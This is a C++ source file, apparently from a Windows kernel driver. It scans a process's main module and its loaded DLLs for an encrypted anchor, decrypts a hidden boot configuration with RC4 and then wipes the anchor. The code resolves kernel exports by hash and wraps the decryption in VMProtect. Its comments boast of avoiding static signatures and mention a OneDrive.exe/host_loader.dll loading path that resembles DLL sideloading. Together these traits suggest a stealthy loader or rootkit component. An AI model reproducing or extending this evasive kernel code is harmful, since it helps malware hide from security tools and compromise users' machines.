#include "Common.h"
#include "DrvSecurity.h"
#include "Utils.h"
#include <ntimage.h>

typedef PVOID(NTAPI *FuncTypeDef_PsGetProcessPeb)(_In_ PEPROCESS Process);

static NTSTATUS ScanModuleSectionsForAnchor(IN PVOID baseAddress, IN ULONG devToken, IN UINT64 expectedTag0,
                                            IN UINT64 expectedTag1, OUT PDRV_BOOT_CONFIG_EX outConfig,
                                            IN OUT PBOOLEAN pbFoundTag, OUT PVOID *ppMatchedAnchor)
{
    if (!baseAddress || (ULONG_PTR)baseAddress >= 0x00007FFFFFFFFFFFULL)
    {
        return STATUS_INVALID_PARAMETER;
    }

    NTSTATUS status = STATUS_NOT_FOUND;

    __try
    {
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)baseAddress;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        {
            return STATUS_INVALID_IMAGE_FORMAT;
        }

        PIMAGE_NT_HEADERS64 pNt = (PIMAGE_NT_HEADERS64)((PUCHAR)baseAddress + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE)
        {
            return STATUS_INVALID_IMAGE_FORMAT;
        }

        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
        USHORT numSecs = pNt->FileHeader.NumberOfSections;
        if (numSecs > 64)
        {
            numSecs = 64;
        }

        for (USHORT i = 0; i < numSecs; i++, pSec++)
        {
            // 扫描所有可读数据/VMP节区 (兼容常规 .data 与 VMP 合并节区)
            if (pSec->Characteristics & IMAGE_SCN_MEM_READ)
            {
                PUCHAR secVA = (PUCHAR)baseAddress + pSec->VirtualAddress;
                ULONG secSize = (pSec->Misc.VirtualSize > pSec->SizeOfRawData) ? pSec->Misc.VirtualSize : pSec->SizeOfRawData;

                if (secSize >= sizeof(DRV_USER_PAYLOAD_ANCHOR) && secSize <= 0x10000000UL)
                {
                    ULONG maxOffset = secSize - sizeof(DRV_USER_PAYLOAD_ANCHOR);
                    for (ULONG pageBase = 0; pageBase <= maxOffset; pageBase += PAGE_SIZE)
                    {
                        ULONG pageEnd = pageBase + PAGE_SIZE;
                        if (pageEnd > maxOffset + 1)
                        {
                            pageEnd = maxOffset + 1;
                        }

                        __try
                        {
                            for (ULONG offset = pageBase; offset < pageEnd; offset += sizeof(ULONG_PTR))
                            {
                                PDRV_USER_PAYLOAD_ANCHOR pAnchor = (PDRV_USER_PAYLOAD_ANCHOR)(secVA + offset);
                                if (pAnchor->Tag0 == expectedTag0 && pAnchor->Tag1 == expectedTag1)
                                {
                                    if (pbFoundTag)
                                        *pbFoundTag = TRUE;
                                    if (pAnchor->CipherLen != sizeof(DRV_BOOT_CONFIG_EX))
                                    {
                                        DBG("[-] DrvSecurity::ScanAndDecryptUserPayload: Tag matched but CipherLen mismatch "
                                            "(%u != %u)",
                                            pAnchor->CipherLen, (ULONG)sizeof(DRV_BOOT_CONFIG_EX));
                                        continue;
                                    }

                                    VMProtectBeginUltra("DrvSecurity::DecryptAndValidatePayload");
                                    // 派生解密密钥: g_SipHashKey (16B) + devToken (4B) + Nonce (4B)
                                    UCHAR key[24];
                                    memcpy(&key[0], g_SipHashKey, 16);
                                    memcpy(&key[16], &devToken, 4);
                                    memcpy(&key[20], &pAnchor->Nonce, 4);

                                    DRV_BOOT_CONFIG_EX plainCfg;
                                    memcpy(&plainCfg, pAnchor->CipherData, sizeof(DRV_BOOT_CONFIG_EX));
                                    Utils::Rc4Decrypt((UCHAR *)&plainCfg, sizeof(DRV_BOOT_CONFIG_EX), key, sizeof(key));

                                    // 校验 Adler32 与 Magic
                                    ULONG calcSum = Utils::CalcAdler32((const UCHAR *)&plainCfg, sizeof(plainCfg));
                                    if (plainCfg.Base.Magic == DRV_BOOT_CONFIG_MAGIC && calcSum == pAnchor->Checksum)
                                    {
                                        memcpy(outConfig, &plainCfg, sizeof(DRV_BOOT_CONFIG_EX));
                                        if (ppMatchedAnchor)
                                        {
                                            *ppMatchedAnchor = pAnchor;
                                        }
                                        else
                                        {
                                            // 若调用方未接管擦除时机，则立即清零用户态内存中的锚点标记与密文
                                            __try
                                            {
                                                RtlSecureZeroMemory(pAnchor, sizeof(DRV_USER_PAYLOAD_ANCHOR));
                                            }
                                            __except (EXCEPTION_EXECUTE_HANDLER)
                                            {
                                            }
                                        }
                                        status = STATUS_SUCCESS;
                                    }
                                    else
                                    {
                                        DBG("[-] DrvSecurity::ScanAndDecryptUserPayload: Payload validation failed! "
                                            "Magic=0x%08X (exp 0x%08X), Checksum=0x%08X (exp 0x%08X)",
                                            plainCfg.Base.Magic, DRV_BOOT_CONFIG_MAGIC, calcSum, pAnchor->Checksum);
                                    }
                                    VMProtectEnd();
                                    if (status == STATUS_SUCCESS)
                                        break;
                                }
                            }
                        }
                        __except (EXCEPTION_EXECUTE_HANDLER)
                        {
                            // 单页未提交或不可读时仅跳过当前页，继续扫描后续页面与节区
                        }

                        if (status == STATUS_SUCCESS)
                            break;
                    }
                }
                if (status == STATUS_SUCCESS)
                    break;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        status = GetExceptionCode();
    }

    return status;
}

NTSTATUS DrvSecurity::ScanAndDecryptUserPayload(IN ULONG devToken, OUT PDRV_BOOT_CONFIG_EX outConfig,
                                                OUT PVOID *ppMatchedAnchor)
{
    if (ppMatchedAnchor)
    {
        *ppMatchedAnchor = NULL;
    }
    if (!outConfig)
    {
        DBG("[-] DrvSecurity::ScanAndDecryptUserPayload: outConfig is NULL");
        return STATUS_INVALID_PARAMETER;
    }

    // 1. 动态 Tag0/Tag1: 完全由当前调用传入的 devToken 实时派生 (无静态常量特征)
    UINT64 expectedTag0 = Utils::SipHash24(g_SipHashKey, (const UCHAR *)&devToken, sizeof(devToken));
    UINT64 expectedTag1 = ~expectedTag0 ^ 0xA5A5A5A55A5A5A5AULL;

    PEPROCESS pProcess = (g_pGlobalUserVar && g_pGlobalUserVar->Func.IoGetCurrentProcess)
                             ? g_pGlobalUserVar->Func.IoGetCurrentProcess()
                             : NULL;
    if (!pProcess)
    {
        DBG("[-] DrvSecurity::ScanAndDecryptUserPayload: IoGetCurrentProcess returned NULL");
        return STATUS_INVALID_PARAMETER;
    }

    PVOID baseAddress = (g_pGlobalUserVar && g_pGlobalUserVar->Func.PsGetProcessSectionBaseAddress)
                            ? g_pGlobalUserVar->Func.PsGetProcessSectionBaseAddress(pProcess)
                            : NULL;

    NTSTATUS status = STATUS_NOT_FOUND;
    BOOLEAN bFoundTag = FALSE;

    // 优先扫描主模块 (.exe)
    if (baseAddress)
    {
        status = ScanModuleSectionsForAnchor(baseAddress, devToken, expectedTag0, expectedTag1, outConfig, &bFoundTag,
                                             ppMatchedAnchor);
    }

    // 兜底：若主模块未命中（如通过 OneDrive.exe 加载 host_loader.dll 场景），遍历 PEB->Ldr 已加载模块链表扫描
    if (status != STATUS_SUCCESS && g_pGlobalUserVar && g_pGlobalUserVar->KernelBase.QuadPart != 0)
    {
        ULONG_PTR pfnPebAddr = 0;
        ULONG hashPsGetProcessPeb = Utils::HashStringA((PCHAR)"PsGetProcessPeb", 15, TRUE);
        if (Utils::GetModuleExport((ULONG_PTR)g_pGlobalUserVar->KernelBase.QuadPart, hashPsGetProcessPeb, &pfnPebAddr) &&
            pfnPebAddr != 0)
        {
            FuncTypeDef_PsGetProcessPeb pfnPsGetProcessPeb = (FuncTypeDef_PsGetProcessPeb)pfnPebAddr;
            PUCHAR pPeb = (PUCHAR)pfnPsGetProcessPeb(pProcess);
            if (pPeb && (ULONG_PTR)pPeb < 0x00007FFFFFFFFFFFULL)
            {
                __try
                {
                    PUCHAR pLdr = *(PUCHAR *)(pPeb + 0x18); // PEB->Ldr
                    if (pLdr && (ULONG_PTR)pLdr < 0x00007FFFFFFFFFFFULL)
                    {
                        PLIST_ENTRY pHead = (PLIST_ENTRY)(pLdr + 0x10); // InLoadOrderModuleList
                        PLIST_ENTRY pCurr = pHead->Flink;
                        for (ULONG modIdx = 0; modIdx < 128 && pCurr && pCurr != pHead; modIdx++, pCurr = pCurr->Flink)
                        {
                            PVOID dllBase = *(PVOID *)((PUCHAR)pCurr + 0x30); // LDR_DATA_TABLE_ENTRY->DllBase
                            if (dllBase && dllBase != baseAddress)
                            {
                                NTSTATUS modSt = ScanModuleSectionsForAnchor(dllBase, devToken, expectedTag0,
                                                                             expectedTag1, outConfig, &bFoundTag,
                                                                             ppMatchedAnchor);
                                if (modSt == STATUS_SUCCESS)
                                {
                                    status = STATUS_SUCCESS;
                                    break;
                                }
                            }
                        }
                    }
                }
                __except (EXCEPTION_EXECUTE_HANDLER)
                {
                }
            }
        }
    }

    if (status != STATUS_SUCCESS && !bFoundTag)
    {
        DBG("[-] DrvSecurity::ScanAndDecryptUserPayload: Target anchor tags not found in user memory "
            "(Token=0x%08X, expectedTag0=0x%016llX)",
            devToken, expectedTag0);
    }

    return status;
}
